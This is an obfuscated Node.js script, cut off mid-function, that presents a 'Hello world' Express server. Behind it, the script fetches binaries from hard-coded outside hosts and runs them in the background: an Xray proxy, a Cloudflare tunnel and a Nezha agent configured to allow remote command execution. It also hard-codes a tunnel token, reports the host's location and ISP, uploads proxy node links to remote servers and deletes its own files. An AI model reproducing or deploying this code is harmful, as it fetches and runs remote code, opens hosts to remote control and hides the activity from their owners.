const _0x31c73e=_0x2772;(function(_0x2780f2,_0x3653dc){const _0x5d2e49=_0x2772,_0x1ceb61=_0x2780f2();while(!![]){try{const _0x516157=parseInt(_0x5d2e49(0x1a4))/0x1*(parseInt(_0x5d2e49(0x1cb))/0x2)+-parseInt(_0x5d2e49(0x186))/0x3+parseInt(_0x5d2e49(0x1a8))/0x4*(parseInt(_0x5d2e49(0x1b5))/0x5)+-parseInt(_0x5d2e49(0x227))/0x6*(parseInt(_0x5d2e49(0x215))/0x7)+-parseInt(_0x5d2e49(0x187))/0x8*(-parseInt(_0x5d2e49(0x19d))/0x9)+-parseInt(_0x5d2e49(0x17f))/0xa*(-parseInt(_0x5d2e49(0x1b0))/0xb)+-parseInt(_0x5d2e49(0x193))/0xc;if(_0x516157===_0x3653dc)break;else _0x1ceb61['push'](_0x1ceb61['shift']());}catch(_0x584884){_0x1ceb61['push'](_0x1ceb61['shift']());}}}(_0x39c0,0x86ed2));const express=require(_0x31c73e(0x20f)),app=express(),axios=require(_0x31c73e(0x226)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x31c73e(0x1a0))[_0x31c73e(0x222)]),{execSync}=require(_0x31c73e(0x1a0)),UPLOAD_URL=process['env'][_0x31c73e(0x179)]||'',PROJECT_URL=process[_0x31c73e(0x19c)][_0x31c73e(0x1d9)]||'',AUTO_ACCESS=process[_0x31c73e(0x19c)][_0x31c73e(0x1ab)]||![],FILE_PATH=process[_0x31c73e(0x19c)][_0x31c73e(0x18f)]||_0x31c73e(0x189),SUB_PATH=process[_0x31c73e(0x19c)]['SUB_PATH']||_0x31c73e(0x19a),PORT=process[_0x31c73e(0x19c)]['SERVER_PORT']||process[_0x31c73e(0x19c)][_0x31c73e(0x1bf)]||0xbb8,UUID=process[_0x31c73e(0x19c)]['UUID']||_0x31c73e(0x218),NEZHA_SERVER=process[_0x31c73e(0x19c)][_0x31c73e(0x1dc)]||'',NEZHA_PORT=process[_0x31c73e(0x19c)][_0x31c73e(0x16a)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x31c73e(0x19c)][_0x31c73e(0x1be)]||_0x31c73e(0x22b),ARGO_AUTH=process[_0x31c73e(0x19c)]['ARGO_AUTH']||'eyJhIjoiZWUwNzFlNDYwYmY1MjViZjRiMzk5NGFjYTk4ODhlZDIiLCJ0IjoiOWQwOTZlMmUtMjY3OS00Y2JjLThkNWMtZGI0NTgyNTc5Yjk1IiwicyI6IllqY3haalZoTmprdE1qazFOUzAwWmpCakxXRXpaVE10TmpsaE9EUTJPRGxoT1RNMCJ9',ARGO_PORT=process[_0x31c73e(0x19c)][_0x31c73e(0x1c6)]||0x1f41,CFIP=process['env'][_0x31c73e(0x1eb)]||_0x31c73e(0x16d),CFPORT=process[_0x31c73e(0x19c)][_0x31c73e(0x1aa)]||0x1bb,NAME=process[_0x31c73e(0x19c)][_0x31c73e(0x16f)]||'albert';!fs[_0x31c73e(0x1d2)](FILE_PATH)?(fs[_0x31c73e(0x1e4)](FILE_PATH),console[_0x31c73e(0x199)](FILE_PATH+'\x20is\x20created')):console[_0x31c73e(0x199)](FILE_PATH+_0x31c73e(0x184));function generateRandomName(){const _0x3f2b3f=_0x31c73e,_0x46cc80=_0x3f2b3f(0x228);let _0x208048='';for(let _0x117cde=0x0;_0x117cde<0x6;_0x117cde++){_0x208048+=_0x46cc80[_0x3f2b3f(0x1a6)](Math[_0x3f2b3f(0x1b4)](Math[_0x3f2b3f(0x223)]()*_0x46cc80['length']));}return _0x208048;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x31c73e(0x206)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x31c73e(0x206)](FILE_PATH,_0x31c73e(0x17b)),listPath=path[_0x31c73e(0x206)](FILE_PATH,'list.txt'),bootLogPath=path[_0x31c73e(0x206)](FILE_PATH,'boot.log'),configPath=path[_0x31c73e(0x206)](FILE_PATH,_0x31c73e(0x1cf));function deleteNodes(){const _0x443f99=_0x31c73e;try{if(!UPLOAD_URL)return;if(!fs[_0x443f99(0x1d2)](subPath))return;let _0x4af7e5;try{_0x4af7e5=fs['readFileSync'](subPath,_0x443f99(0x17a));}catch{return null;}const _0x2778a3=Buffer[_0x443f99(0x1f0)](_0x4af7e5,_0x443f99(0x1f3))[_0x443f99(0x202)]('utf-8'),_0xf64f9e=_0x2778a3[_0x443f99(0x221)]('\x0a')[_0x443f99(0x1e9)](_0x13066d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x443f99(0x1f8)](_0x13066d));if(_0xf64f9e['length']===0x0)return;return axios[_0x443f99(0x173)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0xf64f9e}),{'headers':{'Content-Type':'application/json'}})[_0x443f99(0x1c5)](_0x38d94c=>{return null;}),null;}catch(_0x5220b5){return null;}}function cleanupOldFiles(){const _0x3c4f94=_0x31c73e;try{const _0x6a4aca=fs[_0x3c4f94(0x174)](FILE_PATH);_0x6a4aca[_0x3c4f94(0x22d)](_0x245b9b=>{const _0x1b6a10=_0x3c4f94,_0x36cbdf=path[_0x1b6a10(0x206)](FILE_PATH,_0x245b9b);try{const _0x27294e=fs['statSync'](_0x36cbdf);_0x27294e[_0x1b6a10(0x176)]()&&fs[_0x1b6a10(0x1c8)](_0x36cbdf);}catch(_0x22eb30){}});}catch(_0x2b1703){}}app[_0x31c73e(0x172)]('/',function(_0x54ab93,_0x4ab50c){const _0x22d62f=_0x31c73e;_0x4ab50c[_0x22d62f(0x16b)]('Hello\x20world!');});async function generateConfig(){const _0x4ac592=_0x31c73e,_0x31a4c8={'log':{'access':_0x4ac592(0x1fe),'error':_0x4ac592(0x1fe),'loglevel':_0x4ac592(0x216)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4ac592(0x16e),'settings':{'clients':[{'id':UUID,'flow':_0x4ac592(0x1d5)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4ac592(0x203),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4ac592(0x1fd),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4ac592(0x216)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x4ac592(0x1fd),'protocol':_0x4ac592(0x16e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4ac592(0x216)},'streamSettings':{'network':'ws','security':_0x4ac592(0x216),'wsSettings':{'path':_0x4ac592(0x203)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4ac592(0x18b),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4ac592(0x1da)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4ac592(0x18b),_0x4ac592(0x20d)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4ac592(0x1fd),'protocol':_0x4ac592(0x200),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4ac592(0x1ac),_0x4ac592(0x18b),_0x4ac592(0x20d)],'metadataOnly':![]}}],'dns':{'servers':[_0x4ac592(0x22a)]},'outbounds':[{'protocol':_0x4ac592(0x1f5),'tag':_0x4ac592(0x1d3)},{'protocol':_0x4ac592(0x1bb),'tag':_0x4ac592(0x1b8)}]};fs[_0x4ac592(0x18c)](path[_0x4ac592(0x206)](FILE_PATH,_0x4ac592(0x1cf)),JSON[_0x4ac592(0x220)](_0x31a4c8,null,0x2));}function getSystemArchitecture(){const _0x469eba=_0x31c73e,_0xdbc7da=os[_0x469eba(0x198)]();return _0xdbc7da==='arm'||_0xdbc7da===_0x469eba(0x209)||_0xdbc7da===_0x469eba(0x1ec)?'arm':_0x469eba(0x19b);}function downloadFile(_0x55d20b,_0x1ffa57,_0x2a86e9){const _0x1e5dd1=_0x31c73e,_0x5de75c=_0x55d20b;!fs[_0x1e5dd1(0x1d2)](FILE_PATH)&&fs[_0x1e5dd1(0x1e4)](FILE_PATH,{'recursive':!![]});const _0x332a8f=fs[_0x1e5dd1(0x1b1)](_0x5de75c);axios({'method':_0x1e5dd1(0x172),'url':_0x1ffa57,'responseType':'stream'})[_0x1e5dd1(0x1fb)](_0xbd9c52=>{const _0x3f0d19=_0x1e5dd1;_0xbd9c52[_0x3f0d19(0x1bd)]['pipe'](_0x332a8f),_0x332a8f['on'](_0x3f0d19(0x21b),()=>{const _0x4c0fbe=_0x3f0d19;_0x332a8f[_0x4c0fbe(0x190)](),console['log']('Download\x20'+path[_0x4c0fbe(0x1a5)](_0x5de75c)+_0x4c0fbe(0x1f9)),_0x2a86e9(null,_0x5de75c);}),_0x332a8f['on']('error',_0x3516c5=>{const _0x2cfaaf=_0x3f0d19;fs[_0x2cfaaf(0x204)](_0x5de75c,()=>{});const _0xd82ff4='Download\x20'+path[_0x2cfaaf(0x1a5)](_0x5de75c)+'\x20failed:\x20'+_0x3516c5[_0x2cfaaf(0x1d0)];console[_0x2cfaaf(0x17e)](_0xd82ff4),_0x2a86e9(_0xd82ff4);});})[_0x1e5dd1(0x1c5)](_0x376814=>{const _0x5eb3ba=_0x1e5dd1,_0xe390ab=_0x5eb3ba(0x18e)+path['basename'](_0x5de75c)+_0x5eb3ba(0x1c4)+_0x376814[_0x5eb3ba(0x1d0)];console['error'](_0xe390ab),_0x2a86e9(_0xe390ab);});}async function downloadFilesAndRun(){const _0x180494=_0x31c73e,_0x24dd53=getSystemArchitecture(),_0x24be81=getFilesForArchitecture(_0x24dd53);if(_0x24be81[_0x180494(0x201)]===0x0){console[_0x180494(0x199)](_0x180494(0x1b9));return;}const _0x58ee8c=_0x24be81[_0x180494(0x1d1)](_0x41989b=>{return new Promise((_0x589236,_0xab3f68)=>{const _0x2fef50=_0x2772;downloadFile(_0x41989b['fileName'],_0x41989b[_0x2fef50(0x1e3)],(_0x2606a1,_0x394911)=>{_0x2606a1?_0xab3f68(_0x2606a1):_0x589236(_0x394911);});});});try{await Promise[_0x180494(0x1a2)](_0x58ee8c);}catch(_0xfd7b11){console[_0x180494(0x17e)](_0x180494(0x20b),_0xfd7b11);return;}function _0x2f007a(_0x5d4ba5){const _0xb6ec7a=_0x180494,_0x419cf3=0x1fd;_0x5d4ba5[_0xb6ec7a(0x22d)](_0x2d681f=>{const _0x37d53c=_0xb6ec7a;fs[_0x37d53c(0x1d2)](_0x2d681f)&&fs[_0x37d53c(0x1ee)](_0x2d681f,_0x419cf3,_0x284862=>{const _0x126b18=_0x37d53c;_0x284862?console[_0x126b18(0x17e)](_0x126b18(0x17c)+_0x2d681f+':\x20'+_0x284862):console['log'](_0x126b18(0x1df)+_0x2d681f+':\x20'+_0x419cf3['toString'](0x8));});});}const _0x30c895=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2f007a(_0x30c895);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x22f138=NEZHA_SERVER[_0x180494(0x1f2)](':')?NEZHA_SERVER[_0x180494(0x221)](':')[_0x180494(0x1d6)]():'',_0x4e1b57=new Set([_0x180494(0x1d7),'8443','2096',_0x180494(0x22c),_0x180494(0x181),'2053']),_0x21cfb8=_0x4e1b57[_0x180494(0x1f1)](_0x22f138)?'true':'false',_0x239976=_0x180494(0x1cc)+NEZHA_KEY+_0x180494(0x1c3)+NEZHA_SERVER+_0x180494(0x1bc)+_0x21cfb8+_0x180494(0x17d)+UUID;fs[_0x180494(0x18c)](path[_0x180494(0x206)](FILE_PATH,_0x180494(0x1b6)),_0x239976);const _0x5421d1=_0x180494(0x214)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5421d1),console[_0x180494(0x199)](phpName+_0x180494(0x1ca)),await new Promise(_0xb3216c=>setTimeout(_0xb3216c,0x3e8));}catch(_0x251f54){console['error'](_0x180494(0x1f6)+_0x251f54);}}else{let _0x4dd731='';const _0x40cf01=[_0x180494(0x1d7),_0x180494(0x20c),_0x180494(0x1a9),_0x180494(0x22c),_0x180494(0x181),'2053'];_0x40cf01[_0x180494(0x1f2)](NEZHA_PORT)&&(_0x4dd731=_0x180494(0x16c));const _0x2a9554=_0x180494(0x214)+npmPath+_0x180494(0x229)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4dd731+_0x180494(0x205);try{await exec(_0x2a9554),console[_0x180494(0x199)](npmName+'\x20is\x20running'),await new Promise(_0x5818ed=>setTimeout(_0x5818ed,0x3e8));}catch(_0x5bf1dc){console[_0x180494(0x17e)](_0x180494(0x1e2)+_0x5bf1dc);}}}else console[_0x180494(0x199)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4664db='nohup\x20'+webPath+_0x180494(0x1e0)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4664db),console[_0x180494(0x199)](webName+_0x180494(0x1ca)),await new Promise(_0x352f54=>setTimeout(_0x352f54,0x3e8));}catch(_0x314500){console[_0x180494(0x17e)]('web\x20running\x20error:\x20'+_0x314500);}if(fs[_0x180494(0x1d2)](botPath)){let _0x45716a;if(ARGO_AUTH[_0x180494(0x177)](/^[A-Z0-9a-z=]{120,250}$/))_0x45716a=_0x180494(0x210)+ARGO_AUTH;else ARGO_AUTH[_0x180494(0x177)](/TunnelSecret/)?_0x45716a=_0x180494(0x1d4)+FILE_PATH+_0x180494(0x1e8):_0x45716a=_0x180494(0x1af)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x180494(0x214)+botPath+'\x20'+_0x45716a+_0x180494(0x1e6)),console[_0x180494(0x199)](botName+_0x180494(0x1ca)),await new Promise(_0x328be7=>setTimeout(_0x328be7,0x7d0));}catch(_0x2b41c2){console[_0x180494(0x17e)](_0x180494(0x18a)+_0x2b41c2);}}await new Promise(_0x298d30=>setTimeout(_0x298d30,0x1388));}function getFilesForArchitecture(_0x3870b9){const _0x2c2782=_0x31c73e;let _0x6def8;_0x3870b9==='arm'?_0x6def8=[{'fileName':webPath,'fileUrl':_0x2c2782(0x21c)},{'fileName':botPath,'fileUrl':_0x2c2782(0x180)}]:_0x6def8=[{'fileName':webPath,'fileUrl':_0x2c2782(0x19f)},{'fileName':botPath,'fileUrl':_0x2c2782(0x1c1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x38db8b=_0x3870b9===_0x2c2782(0x1c2)?_0x2c2782(0x211):_0x2c2782(0x21d);_0x6def8['unshift']({'fileName':npmPath,'fileUrl':_0x38db8b});}else{const _0x913886=_0x3870b9===_0x2c2782(0x1c2)?_0x2c2782(0x225):_0x2c2782(0x1db);_0x6def8[_0x2c2782(0x195)]({'fileName':phpPath,'fileUrl':_0x913886});}}return _0x6def8;}function argoType(){const _0x191d4c=_0x31c73e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x191d4c(0x199)](_0x191d4c(0x1e1));return;}if(ARGO_AUTH[_0x191d4c(0x1f2)](_0x191d4c(0x1ff))){fs[_0x191d4c(0x18c)](path[_0x191d4c(0x206)](FILE_PATH,_0x191d4c(0x1fa)),ARGO_AUTH);const _0xc87e36='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x191d4c(0x221)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x191d4c(0x206)](FILE_PATH,_0x191d4c(0x1fa))+_0x191d4c(0x1a3)+ARGO_DOMAIN+_0x191d4c(0x1c9)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x191d4c(0x206)](FILE_PATH,'tunnel.yml'),_0xc87e36);}else console[_0x191d4c(0x199)](_0x191d4c(0x208));}async function extractDomains(){const _0x1b94c6=_0x31c73e;let _0x2238d3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2238d3=ARGO_DOMAIN,console[_0x1b94c6(0x199)](_0x1b94c6(0x1b3),_0x2238d3),await _0x468785(_0x2238d3);else try{const _0x4647bb=fs[_0x1b94c6(0x183)](path[_0x1b94c6(0x206)](FILE_PATH,_0x1b94c6(0x175)),_0x1b94c6(0x17a)),_0x256a14=_0x4647bb[_0x1b94c6(0x221)]('\x0a'),_0x5e594e=[];_0x256a14[_0x1b94c6(0x22d)](_0x42fa17=>{const _0x6b11dd=_0x1b94c6,_0x268d8d=_0x42fa17[_0x6b11dd(0x177)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x268d8d){const _0x1a2a92=_0x268d8d[0x1];_0x5e594e[_0x6b11dd(0x1ef)](_0x1a2a92);}});if(_0x5e594e['length']>0x0)_0x2238d3=_0x5e594e[0x0],console[_0x1b94c6(0x199)]('ArgoDomain:',_0x2238d3),await _0x468785(_0x2238d3);else{console['log'](_0x1b94c6(0x224)),fs['unlinkSync'](path['join'](FILE_PATH,_0x1b94c6(0x175)));async function _0x3e4881(){const _0x4e6c85=_0x1b94c6;try{process[_0x4e6c85(0x197)]===_0x4e6c85(0x1fc)?await exec(_0x4e6c85(0x21f)+botName+_0x4e6c85(0x1e7)):await exec(_0x4e6c85(0x192)+botName['charAt'](0x0)+']'+botName[_0x4e6c85(0x1ea)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x422a71){}}_0x3e4881(),await new Promise(_0x274a69=>setTimeout(_0x274a69,0xbb8));const _0x293d6d='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1b94c6(0x185)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x293d6d+_0x1b94c6(0x1e6)),console['log'](botName+_0x1b94c6(0x1ca)),await new Promise(_0x5038aa=>setTimeout(_0x5038aa,0xbb8)),await extractDomains();}catch(_0x5ac880){console[_0x1b94c6(0x17e)](_0x1b94c6(0x18a)+_0x5ac880);}}}catch(_0x29de3f){console[_0x1b94c6(0x17e)](_0x1b94c6(0x20a),_0x29de3f);}async function _0x1dd7a7(){const _0x237764=_0x1b94c6;try{const _0x47c418=await axios['get'](_0x237764(0x182),{'timeout':0xbb8});if(_0x47c418['data']&&_0x47c418[_0x237764(0x1bd)][_0x237764(0x169)]&&_0x47c418['data']['org'])return _0x47c418[_0x237764(0x1bd)][_0x237764(0x169)]+'_'+_0x47c418[_0x237764(0x1bd)][_0x237764(0x219)];}catch(_0x459b22){try{const _0x329528=await axios[_0x237764(0x172)](_0x237764(0x212),{'timeout':0xbb8});if(_0x329528[_0x237764(0x1bd)]&&_0x329528[_0x237764(0x1bd)]['status']==='success'&&_0x329528[_0x237764(0x1bd)][_0x237764(0x213)]&&_0x329528['data']['org'])return _0x329528['data'][_0x237764(0x213)]+'_'+_0x329528[_0x237764(0x1bd)][_0x237764(0x219)];}catch(_0xfbb381){}}return _0x237764(0x1ed);}async function _0x468785(_0x577baf){const _0x63bf0e=await _0x1dd7a7(),_0x2e28c8=NAME?NAME+'-'+_0x63bf0e:_0x63bf0e;return new Promise(_0x4e840a=>{setTimeout(()=>{const _0x4a4396=_0x2772,_0x474b70={'v':'2','ps':''+_0x2e28c8,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x577baf,'path':_0x4a4396(0x1f7),'tls':_0x4a4396(0x18b),'sni':_0x577baf,'alpn':'','fp':_0x4a4396(0x1b7)},_0x1c0747='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x577baf+_0x4a4396(0x191)+_0x577baf+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2e28c8+_0x4a4396(0x1de)+Buffer['from'](JSON[_0x4a4396(0x220)](_0x474b70))[_0x4a4396(0x202)](_0x4a4396(0x1f3))+_0x4a4396(0x170)+UUID+'@'+CFIP+':'+CFPORT+_0x4a4396(0x1d8)+_0x577baf+_0x4a4396(0x191)+_0x577baf+_0x4a4396(0x1c0)+_0x2e28c8+_0x4a4396(0x1dd);console['log'](Buffer[_0x4a4396(0x1f0)](_0x1c0747)[_0x4a4396(0x202)](_0x4a4396(0x1f3))),fs[_0x4a4396(0x18c)](subPath,Buffer[_0x4a4396(0x1f0)](_0x1c0747)[_0x4a4396(0x202)]('base64')),console[_0x4a4396(0x199)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x126c40,_0x1144da)=>{const _0x1e3fb4=_0x4a4396,_0x304d95=Buffer[_0x1e3fb4(0x1f0)](_0x1c0747)[_0x1e3fb4(0x202)]('base64');_0x1144da[_0x1e3fb4(0x21a)]('Content-Type',_0x1e3fb4(0x19e)),_0x1144da[_0x1e3fb4(0x16b)](_0x304d95);}),_0x4e840a(_0x1c0747);},0x7d0);});}}async function uploadNodes(){const _0x227700=_0x31c73e;if(UPLOAD_URL&&PROJECT_URL){const _0x21fdb8=PROJECT_URL+'/'+SUB_PATH,_0x1f87a9={'subscription':[_0x21fdb8]};try{const _0x2eb2f6=await axios[_0x227700(0x173)](UPLOAD_URL+_0x227700(0x196),_0x1f87a9,{'headers':{'Content-Type':_0x227700(0x21e)}});return _0x2eb2f6&&_0x2eb2f6['status']===0xc8?(console['log'](_0x227700(0x178)),_0x2eb2f6):null;}catch(_0x3aa948){if(_0x3aa948['response']){if(_0x3aa948[_0x227700(0x217)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x227700(0x1d2)](listPath))return;const _0x447bc9=fs['readFileSync'](listPath,_0x227700(0x17a)),_0x5c4eed=_0x447bc9[_0x227700(0x221)]('\x0a')[_0x227700(0x1e9)](_0x3c2f95=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x227700(0x1f8)](_0x3c2f95));if(_0x5c4eed[_0x227700(0x201)]===0x0)return;const _0x515881=JSON[_0x227700(0x220)]({'nodes':_0x5c4eed});try{const _0x1f11b9=await axios[_0x227700(0x173)](UPLOAD_URL+'/api/add-nodes',_0x515881,{'headers':{'Content-Type':_0x227700(0x21e)}});return _0x1f11b9&&_0x1f11b9[_0x227700(0x1ae)]===0xc8?(console[_0x227700(0x199)](_0x227700(0x207)),_0x1f11b9):null;}catch(_0x5a755d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3ec0f8=_0x2772,_0x23123f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x23123f[_0x3ec0f8(0x1ef)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x23123f[_0x3ec0f8(0x1ef)](phpPath);process[_0x3ec0f8(0x197)]===_0x3ec0f8(0x1fc)?exec(_0x3ec0f8(0x1ce)+_0x23123f[_0x3ec0f8(0x206)]('\x20')+_0x3ec0f8(0x188),_0x47e422=>{const _0x1f410a=_0x3ec0f8;console[_0x1f410a(0x171)](),console['log'](_0x1f410a(0x20e)),console[_0x1f410a(0x199)](_0x1f410a(0x1a1));}):exec(_0x3ec0f8(0x1b2)+_0x23123f[_0x3ec0f8(0x206)]('\x20')+_0x3ec0f8(0x1ad),_0x21f212=>{const _0x5bb89e=_0x3ec0f8;console['clear'](),console[_0x5bb89e(0x199)](_0x5bb89e(0x20e)),console['log'](_0x5bb89e(0x1a1));});},0x15f90);}function _0x39c0(){const _0x49d879=['arch','log','abc','amd','env','9ogttOi','text/plain;\x20charset=utf-8','https://amd64.ssss.nyc.mn/web','child_process','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','all','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','7431LSGKES','basename','charAt','Error\x20in\x20startserver:','84BZVSkz','2096','CFPORT','AUTO_ACCESS','http','\x20>/dev/null\x202>&1','status','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','11iJotRn','createWriteStream','rm\x20-rf\x20','ARGO_DOMAIN:','floor','63215UlWQKL','config.yaml','firefox','block','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','https://oooo.serv00.net/add-url','blackhole','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','data','ARGO_DOMAIN','PORT','&path=%2Ftrojan-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/bot','arm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20failed:\x20','catch','ARGO_PORT','Skipping\x20adding\x20automatic\x20access\x20task','unlinkSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20is\x20running','178xkDabc','\x0aclient_secret:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','del\x20/f\x20/q\x20','config.json','message','map','existsSync','direct','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','xtls-rprx-vision','pop','443','?security=tls&sni=','PROJECT_URL','/vmess-argo','https://amd64.ssss.nyc.mn/v1','NEZHA_SERVER','\x0a\x20\x20\x20\x20','\x0a\x0avmess://','Empowerment\x20success\x20for\x20','\x20-c\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','npm\x20running\x20error:\x20','fileUrl','mkdirSync','listen','\x20>/dev/null\x202>&1\x20&','.exe\x20>\x20nul\x202>&1','/tunnel.yml\x20run','filter','substring','CFIP','aarch64','Unknown','chmod','push','from','has','includes','base64','http\x20server\x20is\x20running\x20on\x20port:','freedom','php\x20running\x20error:\x20','/vmess-argo?ed=2560','test','\x20successfully','tunnel.json','then','win32','127.0.0.1','/dev/null','TunnelSecret','trojan','length','toString','/vless-argo','unlink','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','join','Nodes\x20uploaded\x20successfully','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','arm64','Error\x20reading\x20boot.log:','Error\x20downloading\x20files:','8443','quic','App\x20is\x20running','express','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://arm64.ssss.nyc.mn/agent','http://ip-api.com/json/','countryCode','nohup\x20','6888NFdFyh','none','response','3ef35236-d7ad-4f05-aa32-307ed805dceb','org','set','finish','https://arm64.ssss.nyc.mn/web','https://amd64.ssss.nyc.mn/agent','application/json','taskkill\x20/f\x20/im\x20','stringify','split','exec','random','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://arm64.ssss.nyc.mn/v1','axios','3168vIHfUE','abcdefghijklmnopqrstuvwxyz','\x20-s\x20','https+local://8.8.8.8/dns-query','abcd.albert12345.de5.net','2087','forEach','country_code','NEZHA_PORT','send','--tls','cf.877774.xyz','vless','NAME','\x0a\x0atrojan://','clear','get','post','readdirSync','boot.log','isFile','match','Subscription\x20uploaded\x20successfully','UPLOAD_URL','utf-8','sub.txt','Empowerment\x20failed\x20for\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','error','9537460QLAqcA','https://arm64.ssss.nyc.mn/bot','2083','https://ipapi.co/json/','readFileSync','\x20already\x20exists','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','1633119xQaHus','1080568VWQUGw','\x20>\x20nul\x202>&1','./tmp','Error\x20executing\x20command:\x20','tls','writeFileSync','Unhandled\x20error\x20in\x20startserver:','Download\x20','FILE_PATH','close','&fp=firefox&type=ws&host=','pkill\x20-f\x20\x22[','4789152fferMC','automatic\x20access\x20task\x20added\x20successfully','unshift','/api/add-subscriptions','platform'];_0x39c0=function(){return _0x49d879;};return _0x39c0();}cleanFiles();async function AddVisitTask(){const _0x5284b0=_0x31c73e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5284b0(0x199)](_0x5284b0(0x1c7));return;}try{const _0x5f3bdd=await axios[_0x5284b0(0x173)](_0x5284b0(0x1ba),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x5284b0(0x199)](_0x5284b0(0x194)),_0x5f3bdd;}catch(_0x1fbcdf){return console[_0x5284b0(0x17e)](_0x5284b0(0x1cd)+_0x1fbcdf[_0x5284b0(0x1d0)]),null;}}function _0x2772(_0x2d44c6,_0x37ddb0){_0x2d44c6=_0x2d44c6-0x169;const _0x39c088=_0x39c0();let _0x277264=_0x39c088[_0x2d44c6];return _0x277264;}async function startserver(){const _0x4e3418=_0x31c73e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 